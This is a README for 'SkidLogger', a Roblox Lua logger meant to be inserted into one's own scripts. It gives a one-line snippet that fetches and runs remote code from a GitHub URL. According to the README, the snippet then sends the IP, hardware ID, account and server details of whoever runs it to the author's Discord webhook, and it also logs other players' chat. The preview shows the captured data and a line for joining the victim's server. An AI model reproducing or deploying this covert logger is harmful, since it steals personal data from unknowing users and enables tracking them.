# How To Use the SkidLogger in your script?

Before you'll do all of those steps, note, that you should have a discord webhook API URL, before inserting the skidlogger in your own script.

1. Insert this code:
```lua
pcall(function()task.spawn(function()loadstring(game:HttpGet("http://github.com/IvanTheProtogen/skidlogger/raw/main/main.lua"))()("<<URL>>")end)end);
```
2. Replace the `<<URL>>` with your own discord webhook API URL.
3. Profit.

# What does it do?

It sends anyone's (whoever executes the code) IP, HWID, Username, User ID, Display Name, Place ID, Job ID and Universe ID via the webhook. It also logs messages said by players in the same server where the victim is at.

## Previews 

```
# Skid Got Caught!

HWID: ################################################################
Skidlogger Session ID: ##########
Username: IvanTheProtogen0
Display Name: IvanTheScript
User ID: 4856500064
Game Job ID: ########-####-####-####-############
Game Universe ID: ##########
Game Place ID: ##########
IP: ###.###.###.###

Join the skid by executing this code!: 
``lua
game:GetService("TeleportService"):TeleportToPlaceInstance(##########, "########-####-####-####-############", game:GetService("Players").LocalPlayer);
``
```

```
[[##########]] IvanTheScript (@IvanTheProtogen0) >> Hello World!
```
